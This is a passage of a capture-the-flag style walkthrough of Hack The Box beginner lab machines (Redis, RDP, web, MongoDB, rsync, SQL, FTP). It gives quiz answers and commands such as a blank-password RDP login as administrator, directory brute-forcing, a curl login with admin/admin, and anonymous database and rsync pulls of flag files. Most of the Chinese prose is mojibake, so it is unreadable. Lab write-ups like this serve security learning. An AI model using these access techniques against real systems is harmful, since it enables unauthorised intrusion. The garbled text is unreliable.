<li>å“ªä¸ªå‘½ä»¤ç”¨äºè·å–æ•°æ®åº“ä¸­çš„æ‰€æœ‰é”®ï¼Ÿï¼š <code>keys *</code></li>
<li>å“ªä¸ªå‘½ä»¤ç”¨äºè¯»å–é”®å€¼?ï¼š<code>get</code></li>
</ol>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯Redis"><a href="#ä»€ä¹ˆæ˜¯Redis" class="headerlink" title="ä»€ä¹ˆæ˜¯Redis"></a>ä»€ä¹ˆæ˜¯Redis</h4><blockquote>
<p><strong>Redis</strong> (REmote DIctionary Server) æ˜¯ä¸€ç§å¼€æºçš„é«˜çº§ <code>NoSQL</code> <strong>é”®å€¼æ•°æ®å­˜å‚¨</strong>ï¼Œç”¨ä½œæ•°æ®åº“ã€ç¼“å­˜å’Œæ¶ˆæ¯ä»£ç†ã€‚</p>
<p>æ•°æ®ä»¥å…·æœ‰é”®å€¼å¯¹çš„å­—å…¸æ ¼å¼å­˜å‚¨ã€‚æ•°æ®åº“å­˜å‚¨åœ¨<code>æœåŠ¡å™¨çš„ RAMï¼ˆå†…å­˜ä¸­ï¼‰</code>ä¸­ä»¥å®ç°å¿«é€Ÿæ•°æ®è®¿é—®ã€‚Redis è¿˜ä¼šä»¥ä¸åŒçš„æ—¶é—´é—´éš”å°†æ•°æ®åº“çš„å†…å®¹å†™å…¥ç£ç›˜ï¼Œä»¥åœ¨<code>å‘ç”Ÿæ•…éšœæ—¶å°†å…¶ä½œä¸ºå¤‡ä»½æŒä¹…ä¿å­˜</code>ã€‚</p>
<p>Redis æ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ ANSI C è¯­è¨€ç¼–å†™ã€éµå®ˆ BSD åè®®ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜ã€åˆ†å¸ƒå¼ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹(Key-Value)å­˜å‚¨æ•°æ®åº“ï¼Œå¹¶æä¾›å¤šç§è¯­è¨€çš„ APIã€‚</p>
<p>Redis é€šå¸¸è¢«ç§°ä¸ºæ•°æ®ç»“æ„æœåŠ¡å™¨ï¼Œå› ä¸ºå€¼ï¼ˆvalueï¼‰å¯ä»¥æ˜¯å­—ç¬¦ä¸²(String)ã€å“ˆå¸Œ(Hash)ã€åˆ—è¡¨(list)ã€é›†åˆ(sets)å’Œæœ‰åºé›†åˆ(sorted sets)ç­‰ç±»å‹ã€‚</p>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯NoSQL"><a href="#ä»€ä¹ˆæ˜¯NoSQL" class="headerlink" title="ä»€ä¹ˆæ˜¯NoSQL"></a>ä»€ä¹ˆæ˜¯NoSQL</h4><blockquote>
<p>NoSQLï¼Œæ³›æŒ‡éå…³ç³»å‹çš„æ•°æ®åº“ã€‚</p>
<p>éšç€äº’è”ç½‘<a href="https://baike.baidu.com/item/web2.0/97695">web2.0</a>ç½‘ç«™çš„å…´èµ·ï¼Œä¼ ç»Ÿçš„å…³ç³»æ•°æ®åº“åœ¨å¤„ç†web2.0ç½‘ç«™ï¼Œç‰¹åˆ«æ˜¯è¶…å¤§è§„æ¨¡å’Œé«˜å¹¶å‘çš„<a href="https://baike.baidu.com/item/SNS/10242">SNS</a>ç±»å‹çš„web2.0çº¯<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E7%BD%91">åŠ¨æ€ç½‘</a>ç«™å·²ç»æ˜¾å¾—åŠ›ä¸ä»å¿ƒï¼Œå‡ºç°äº†å¾ˆå¤šéš¾ä»¥å…‹æœçš„é—®é¢˜ï¼Œè€Œéå…³ç³»å‹çš„æ•°æ®åº“åˆ™ç”±äºå…¶æœ¬èº«çš„ç‰¹ç‚¹å¾—åˆ°äº†éå¸¸è¿…é€Ÿçš„å‘å±•ã€‚</p>
<p>NoSQLæ•°æ®åº“çš„äº§ç”Ÿå°±æ˜¯ä¸ºäº†è§£å†³å¤§è§„æ¨¡æ•°æ®é›†åˆå¤šé‡æ•°æ®ç§ç±»å¸¦æ¥çš„æŒ‘æˆ˜ï¼Œç‰¹åˆ«æ˜¯å¤§æ•°æ®åº”ç”¨éš¾é¢˜ã€‚</p>
</blockquote>
<h3 id="è¿‡ç¨‹-3"><a href="#è¿‡ç¨‹-3" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">redis-<span class="keyword">cli</span> -h target_ip</span><br><span class="line"><span class="meta">#è¿æ¥åˆ° redis æœåŠ¡å™¨</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230127145928047.png" alt="image-20230127145928047"></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">keys</span> * </span><br><span class="line"><span class="comment">#è·å–æ•°æ®åº“ä¸­çš„æ‰€æœ‰é”®</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230127145944398.png" alt="image-20230127145944398"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get</span> flag</span><br><span class="line"><span class="comment">#è·å–flagé”®å€¼</span></span><br></pre></td></tr></table></figure>

<p>ã€åŠ¨æ€flagï¼Œä¸èƒ½å±•ç¤º.pngã€‘</p>
<h2 id="Â·Explosion"><a href="#Â·Explosion" class="headerlink" title="Â·Explosion"></a>Â·Explosion</h2><h3 id="Tags-4"><a href="#Tags-4" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>ç½‘ç»œ</code></p>
<p><code>ç¼–ç¨‹</code></p>
<p><code>RDP</code></p>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>å¼±å‡­è¯</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-4"><a href="#çŸ¥è¯†ç‚¹-4" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li>3 ä¸ªå­—æ¯çš„é¦–å­—æ¯ç¼©ç•¥è¯ RDP ä»£è¡¨ä»€ä¹ˆï¼Ÿï¼š<code>Remote Desktop Protocol</code>ï¼ˆè¿œç¨‹æ¡Œé¢åè®®ï¼‰</li>
<li>è¡¨ç¤ºé€šè¿‡å‘½ä»¤è¡Œç•Œé¢ä¸ä¸»æœºäº¤äº’çš„ä¸‰ä¸ªå­—æ¯çš„é¦–å­—æ¯ç¼©å†™è¯æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>CLI</code></li>
<li>é‚£ä¹ˆå›¾å½¢ç”¨æˆ·ç•Œé¢äº¤äº’å‘¢ï¼Ÿï¼š<code>GUI</code></li>
<li>é»˜è®¤æƒ…å†µä¸‹æœªåŠ å¯†çš„æ—§è¿œç¨‹è®¿é—®å·¥å…·çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>telnet</code></li>
<li>åœ¨ TCP 3389 ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ<code>ms-wbt-server</code>(RDPæœåŠ¡ï¼Œé»˜è®¤ç«¯å£3389)</li>
<li>ä½¿ç”¨ xfreerdp æ—¶ç”¨äºæŒ‡å®šç›®æ ‡ä¸»æœº IP åœ°å€çš„å¼€å…³æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>/v:</code>(æ‰“å¼€å·¥å…·å³å¯æŸ¥çœ‹)</li>
<li>ä»€ä¹ˆç”¨æˆ·åä½¿ç”¨ç©ºç™½å¯†ç æˆåŠŸè¿”å›æ¡Œé¢æŠ•å½±ç»™æˆ‘ä»¬ï¼Ÿï¼š <code>administrator</code>ï¼ˆwindowsç”¨æˆ·çš„æœ€é«˜æƒé™ï¼‰</li>
</ol>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯RDP"><a href="#ä»€ä¹ˆæ˜¯RDP" class="headerlink" title="ä»€ä¹ˆæ˜¯RDP"></a>ä»€ä¹ˆæ˜¯RDP</h4><blockquote>
<p><strong>è¿œç¨‹æ¡Œé¢</strong>åè®® ( <strong>RDP</strong> ) æ˜¯ Microsoft å¼€å‘çš„ä¸“æœ‰åè®®ï¼Œå®ƒ<code>ä¸ºç”¨æˆ·æä¾›å›¾å½¢ç•Œé¢ä»¥é€šè¿‡ç½‘ç»œè¿æ¥åˆ°å¦ä¸€å°è®¡ç®—æœº</code>ã€‚ç”¨æˆ·ä¸ºæ­¤ç›®çš„ä½¿ç”¨<strong>RDPå®¢æˆ·ç«¯è½¯ä»¶ï¼Œè€Œå¦ä¸€å°è®¡ç®—æœºå¿…é¡»è¿è¡Œ</strong> <strong>RDP</strong>æœåŠ¡å™¨è½¯ä»¶</p>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯freerdp"><a href="#ä»€ä¹ˆæ˜¯freerdp" class="headerlink" title="ä»€ä¹ˆæ˜¯freerdp"></a>ä»€ä¹ˆæ˜¯freerdp</h4><blockquote>
<p>FreeRDPæ˜¯ä¸€ä¸ªRemote Desktop Protocolï¼ˆåè®®ï¼‰çš„ä¸€ä¸ªå®ç°ï¼Œéµå¾ªApacheå¼€æºåè®®ï¼Œ<code>æ”¯æŒ3DåŠŸèƒ½ï¼Œå¹¶æœ‰è¾ƒé«˜åˆ·æ–°ç‡ï¼Œä¹Ÿæ”¯æŒRemoteFXï¼ŒH264ç¼–è§£ç ï¼Œç”¨æˆ·ç®¡ç†ï¼ŒéŸ³é¢‘ä»¥åŠå¤–è®¾é‡å®šå‘</code>ç­‰åŠŸèƒ½ã€‚</p>
</blockquote>
<h3 id="è¿‡ç¨‹-4"><a href="#è¿‡ç¨‹-4" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:10.129.31.107 /u:administrator</span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230127174214417.png" alt="image-20230127174214417"></p>
<h2 id="Preignition"><a href="#Preignition" class="headerlink" title="Preignition"></a>Preignition</h2><h3 id="Tags-5"><a href="#Tags-5" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>ç½‘ç»œ</code></p>
<p><code>ä¼ ç»Ÿåº”ç”¨</code></p>
<p><code>Apache</code></p>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>ç½‘ç«™ç»“æ„å‘ç°</code></p>
<p><code>é»˜è®¤å‡­è¯</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-5"><a href="#çŸ¥è¯†ç‚¹-5" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li><p>ç›®å½•æš´åŠ›ç ´è§£æ˜¯ä¸€ç§ç”¨äºæ£€æŸ¥ Web æœåŠ¡å™¨ä¸Šçš„è®¸å¤šè·¯å¾„ä»¥æŸ¥æ‰¾éšè—é¡µé¢çš„æŠ€æœ¯ã€‚å¦å«åšï¼Ÿ:<code>dir busting</code></p>
</li>
<li><p>nmapçš„æ‰«æç”¨ä»€ä¹ˆswitchæ¥æŒ‡å®šæˆ‘ä»¬è¦è¿›è¡Œç‰ˆæœ¬æ£€æµ‹ï¼š<code>-sV</code></p>
</li>
<li><p>æˆ‘ä»¬ä½¿ç”¨ä»€ä¹ˆå¼€å…³æ¥æŒ‡å®šæˆ‘ä»¬è¦ä¸“é—¨æ‰§è¡Œ dir busting çš„ Gobusterï¼Ÿï¼š<code>dir</code></p>
</li>
<li><p>å½“ä½¿ç”¨ gobuster åˆ° dir bust æ—¶ï¼Œæˆ‘ä»¬æ·»åŠ ä»€ä¹ˆå¼€å…³ä»¥ç¡®ä¿å®ƒæ‰¾åˆ° PHP é¡µé¢ï¼Ÿï¼š<code>-x php</code></p>
</li>
</ol>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯Gobuster"><a href="#ä»€ä¹ˆæ˜¯Gobuster" class="headerlink" title="ä»€ä¹ˆæ˜¯Gobuster"></a>ä»€ä¹ˆæ˜¯Gobuster</h4><blockquote>
<p>Gobusteræ˜¯Kali Linuxé»˜è®¤å®‰è£…çš„ä¸€æ¬¾æš´åŠ›æ‰«æå·¥å…·ã€‚ å®ƒæ˜¯ä½¿ç”¨Goè¯­è¨€ç¼–å†™çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå…·å¤‡ä¼˜å¼‚çš„æ‰§è¡Œæ•ˆç‡å’Œå¹¶å‘æ€§èƒ½ã€‚ è¯¥å·¥å…·æ”¯æŒå¯¹å­åŸŸåå’ŒWebç›®å½•è¿›è¡ŒåŸºäºå­—å…¸çš„æš´åŠ›æ‰«æã€‚</p>
</blockquote>
<h3 id="è¿‡ç¨‹-5"><a href="#è¿‡ç¨‹-5" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gobuster dir -w <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>dirb<span class="regexp">/common.txt -u http:/</span><span class="regexp">/10.129.158.233/</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230127211339954.png" alt="image-20230127211339954"></p>
<p>ã€ä¸‹é¢æ˜¯ç”±äºæˆ‘ç”¨çš„wslï¼Œæ²¡ç”¨vmï¼Œæ— æ³•å¯åŠ¨chromeï¼Œäºæ˜¯ç”¨curlä¼ postç™»å½•æ•°æ®ï¼Œæ²¡æœ‰è¦æ±‚ç›´æ¥å¼±å¯†ç ã€‘</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">curl</span> http://10.129.158.233/admin.php -X POST -d <span class="string">&quot;username=admin&amp;password=adm</span></span><br><span class="line"><span class="string">in&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230127211215675.png" alt="image-20230127211215675"></p>
<h2 id="Mongod"><a href="#Mongod" class="headerlink" title="*Mongod"></a>*Mongod</h2><h3 id="Tags-6"><a href="#Tags-6" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>MongoDB </code></p>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>ç½‘ç»œ</code></p>
<p><code>æ•°æ®åº“</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>é…ç½®é”™è¯¯</code></p>
<p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-6"><a href="#çŸ¥è¯†ç‚¹-6" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li><p>MongoDB æ˜¯ä»€ä¹ˆç±»å‹çš„æ•°æ®åº“ï¼Ÿï¼š <code>NoSQL</code></p>
</li>
<li><p>ä¸ mongodb-clients è½¯ä»¶åŒ…ä¸€èµ·å®‰è£…çš„ Mongo shell çš„å‘½ä»¤åç§°æ˜¯ä»€ä¹ˆï¼Ÿ: <code>mongo</code></p>
</li>
<li><p>ç”¨äºåˆ—å‡º MongoDB æœåŠ¡å™¨ä¸Šå­˜åœ¨çš„æ‰€æœ‰æ•°æ®åº“çš„å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿ: <code>show dbs</code></p>
</li>
<li><p>ç”¨äºåˆ—å‡ºæ•°æ®åº“ä¸­é›†åˆçš„å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿï¼š <code>show collections</code></p>
</li>
<li><p>å°†åä¸º flag çš„é›†åˆä¸­æ‰€æœ‰æ–‡æ¡£çš„å†…å®¹ä»¥æ˜“äºé˜…è¯»çš„æ ¼å¼è½¬å‚¨çš„å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿ: <code>db.flag.find().pretty()</code></p>
</li>
</ol>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯MongoDB"><a href="#ä»€ä¹ˆæ˜¯MongoDB" class="headerlink" title="ä»€ä¹ˆæ˜¯MongoDB"></a>ä»€ä¹ˆæ˜¯MongoDB</h4><blockquote>
<p>MongoDBæ˜¯ä¸€ä¸ªåŸºäºåˆ†å¸ƒå¼æ–‡ä»¶å­˜å‚¨ [1] çš„æ•°æ®åº“ã€‚ç”±<a href="https://baike.baidu.com/item/C%2B%2B?fromModule=lemma_inlink">C++</a>è¯­è¨€ç¼–å†™ã€‚æ—¨åœ¨ä¸ºWEBåº”ç”¨æä¾›å¯æ‰©å±•çš„é«˜æ€§èƒ½æ•°æ®å­˜å‚¨è§£å†³æ–¹æ¡ˆã€‚</p>
<p>MongoDBæ˜¯ä¸€ä¸ªä»‹äº<a href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93?fromModule=lemma_inlink">å…³ç³»æ•°æ®åº“</a>å’Œéå…³ç³»æ•°æ®åº“ä¹‹é—´çš„äº§å“ï¼Œæ˜¯éå…³ç³»æ•°æ®åº“å½“ä¸­åŠŸèƒ½æœ€ä¸°å¯Œï¼Œæœ€åƒå…³ç³»æ•°æ®åº“çš„ã€‚å®ƒæ”¯æŒçš„æ•°æ®ç»“æ„éå¸¸æ¾æ•£ï¼Œæ˜¯ç±»ä¼¼<a href="https://baike.baidu.com/item/json?fromModule=lemma_inlink">json</a>çš„<a href="https://baike.baidu.com/item/bson?fromModule=lemma_inlink">bson</a>æ ¼å¼ï¼Œå› æ­¤å¯ä»¥å­˜å‚¨æ¯”è¾ƒå¤æ‚çš„æ•°æ®ç±»å‹ã€‚Mongoæœ€å¤§çš„ç‰¹ç‚¹æ˜¯å®ƒæ”¯æŒçš„æŸ¥è¯¢è¯­è¨€éå¸¸å¼ºå¤§ï¼Œå…¶è¯­æ³•æœ‰ç‚¹ç±»ä¼¼äºé¢å‘å¯¹è±¡çš„æŸ¥è¯¢è¯­è¨€ï¼Œå‡ ä¹å¯ä»¥å®ç°ç±»ä¼¼å…³ç³»æ•°æ®åº“å•è¡¨æŸ¥è¯¢çš„ç»å¤§éƒ¨åˆ†åŠŸèƒ½ï¼Œè€Œä¸”è¿˜æ”¯æŒå¯¹æ•°æ®å»ºç«‹<a href="https://baike.baidu.com/item/%E7%B4%A2%E5%BC%95?fromModule=lemma_inlink">ç´¢å¼•</a>ã€‚</p>
</blockquote>
<h3 id="è¿‡ç¨‹-6"><a href="#è¿‡ç¨‹-6" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">mongo mongodb:<span class="comment">//10.129.173.130</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230129215710939.png" alt="image-20230129215710939"></p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230129215752293.png" alt="image-20230129215752293"></p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> sensitive_information</span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230129215912471.png" alt="image-20230129215912471"></p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> collections</span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230129215847534.png" alt="image-20230129215847534"></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.flag</span><span class="selector-class">.find</span>()<span class="selector-class">.pretty</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230129215955916.png" alt="image-20230129215955916"></p>
<h2 id="Synced"><a href="#Synced" class="headerlink" title="*Synced"></a>*Synced</h2><h3 id="Tags-7"><a href="#Tags-7" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>Rsync</code></p>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>ç½‘ç»œ</code></p>
<p><code>åè®®</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-7"><a href="#çŸ¥è¯†ç‚¹-7" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li>rsync çš„é»˜è®¤ç«¯å£æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>873</code></li>
<li>Linux ä¸Šä¸ rsync äº¤äº’çš„æœ€å¸¸ç”¨å‘½ä»¤åç§°æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>rsync</code> </li>
<li>æ‚¨å¿…é¡»å‘ rsync ä¼ é€’å“ªäº›å‡­æ®æ‰èƒ½ä½¿ç”¨åŒ¿åèº«ä»½éªŒè¯ï¼Ÿï¼š<code>None</code>(æ— )</li>
<li>ä»…åˆ—å‡º rsync ä¸Šçš„å…±äº«å’Œæ–‡ä»¶çš„é€‰é¡¹æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆæ— éœ€åŒ…æ‹¬å‰å¯¼ â€“ å­—ç¬¦ï¼‰ï¼š<code>list-only</code></li>
</ol>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯rsync"><a href="#ä»€ä¹ˆæ˜¯rsync" class="headerlink" title="ä»€ä¹ˆæ˜¯rsync"></a>ä»€ä¹ˆæ˜¯rsync</h4><blockquote>
<p>rsyncæ˜¯<a href="https://baike.baidu.com/item/linux%E7%B3%BB%E7%BB%9F/1732935?fromModule=lemma_inlink">linuxç³»ç»Ÿ</a>ä¸‹çš„æ•°æ®é•œåƒå¤‡ä»½å·¥å…·ã€‚ä½¿ç”¨å¿«é€Ÿå¢é‡å¤‡ä»½å·¥å…·Remote Syncå¯ä»¥è¿œç¨‹åŒæ­¥ï¼Œæ”¯æŒæœ¬åœ°å¤åˆ¶ï¼Œæˆ–è€…ä¸å…¶ä»–SSHã€rsyncä¸»æœºåŒæ­¥ã€‚</p>
<p>å·²æ”¯æŒè·¨å¹³å°ï¼Œå¯ä»¥åœ¨Windowsä¸Linuxé—´è¿›è¡Œæ•°æ®åŒæ­¥ã€‚</p>
</blockquote>
<h3 id="è¿‡ç¨‹-7"><a href="#è¿‡ç¨‹-7" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rsync</span> --list-only <span class="number">10.129.33.133</span>::</span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230129222433250.png" alt="image-20230129222433250"></p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">rsync --list-only <span class="number">10.129.33.133</span><span class="number">::</span>public</span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230129222509164.png" alt="image-20230129222509164"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">rsync <span class="number">10.129</span>.<span class="number">33.133</span><span class="symbol">:</span><span class="symbol">:public/flag</span>.txt flag.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230129223114091.png" alt="image-20230129223114091"></p>
<h1 id="ç¬¬1å±‚"><a href="#ç¬¬1å±‚" class="headerlink" title="ç¬¬1å±‚"></a>ç¬¬1å±‚</h1><h2 id="Appointment"><a href="#Appointment" class="headerlink" title="Appointment"></a>Appointment</h2><h3 id="Tags-8"><a href="#Tags-8" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>ç½‘ç»œ</code></p>
<p><code>æ•°æ®åº“</code></p>
<p><code>æ³¨å…¥</code></p>
<p><code>Apache</code></p>
<p><code>SQL</code></p>
<p><code>PHP</code></p>
<p><code>æ•°æ®åº“</code></p>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>SQLæ³¨å…¥</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-8"><a href="#çŸ¥è¯†ç‚¹-8" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li>SQL çš„ç¼©å†™ä»£è¡¨ä»€ä¹ˆï¼Ÿï¼š<code>Structured Query Language</code>ï¼ˆç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼‰</li>
<li>æœ€å¸¸è§çš„ SQL æ¼æ´ç±»å‹ä¹‹ä¸€æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>SQL injection</code>ï¼ˆSQLæ³¨å…¥ï¼‰</li>
<li>PII ä»£è¡¨ä»€ä¹ˆï¼Ÿï¼š<code>Personally Identifiable Information</code>ï¼ˆä¸ªäººèº«ä»½ä¿¡æ¯ï¼‰</li>
<li>æ­¤æ¼æ´çš„ 2021 OWASP Top 10 åˆ†ç±»æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>A03:2021-Injection</code></li>
<li>HTTPS åè®®ä½¿ç”¨çš„æ ‡å‡†ç«¯å£æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>443</code></li>
<li>Web åº”ç”¨ç¨‹åºæœ¯è¯­ä¸­çš„æ–‡ä»¶å¤¹æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>directory</code></li>
<li>â€œæœªæ‰¾åˆ°â€é”™è¯¯çš„ HTTP å“åº”ä»£ç æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>404</code></li>
<li>å¦‚æœä¸å°å¿ƒå¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œå®ƒå¯èƒ½ä¼šè¢«è§£é‡Šä¸ºè¯„è®ºã€‚åœ¨ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹ä½¿ç”¨è¯„è®ºä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•ã€‚è¿”å›çš„ç½‘é¡µä¸Šçš„ç¬¬ä¸€ä¸ªè¯æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>Congratulations</code></li>
</ol>
</blockquote>
<h2 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h2><h3 id="Tags-9"><a href="#Tags-9" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>æ¼æ´è¯„ä¼°</code></p>
<p><code>æ•°æ®åº“</code></p>
<p><code>MySQL</code></p>
<p><code>SQL</code></p>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>å¼±å‡­è¯</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-9"><a href="#çŸ¥è¯†ç‚¹-9" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li>å“ªä¸ªç«¯å£ä¸º MySQL æä¾›æœåŠ¡ï¼Ÿï¼š<code>3306</code></li>
<li>ä½¿ç”¨ MySQL å‘½ä»¤è¡Œå®¢æˆ·ç«¯æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä»€ä¹ˆå¼€å…³æ¥æŒ‡å®šç™»å½•ç”¨æˆ·åï¼Ÿï¼š<code>-u</code></li>
<li>åœ¨ SQL ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»€ä¹ˆç¬¦å·æ¥åœ¨æŸ¥è¯¢ä¸­æŒ‡å®šæˆ‘ä»¬è¦æ˜¾ç¤ºè¡¨ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Ÿ:<code>*</code></li>
</ol>
</blockquote>
<h2 id="Crocodile"><a href="#Crocodile" class="headerlink" title="Crocodile"></a>Crocodile</h2><h3 id="Tags-10"><a href="#Tags-10" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>ç½‘ç»œ</code></p>
<p><code>ä¼ ç»Ÿåº”ç”¨</code></p>
<p><code>åè®®</code></p>
<p><code>Apache</code></p>
<p><code>FTP</code></p>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>ç½‘ç«™ç»“æ„å‘ç°</code></p>
<p><code>æ˜æ–‡å‡­è¯</code></p>
<p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-10"><a href="#çŸ¥è¯†ç‚¹-10" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li>ä»€ä¹ˆ Nmap æ‰«æå¼€å…³åœ¨æ‰«ææœŸé—´ä½¿ç”¨é»˜è®¤è„šæœ¬ï¼Ÿï¼š<code>-sC</code></li>
<li>â€œå…è®¸åŒ¿å FTP ç™»å½•â€æ¶ˆæ¯è¿”å›ç»™æˆ‘ä»¬çš„ FTP ä»£ç æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>230</code></li>
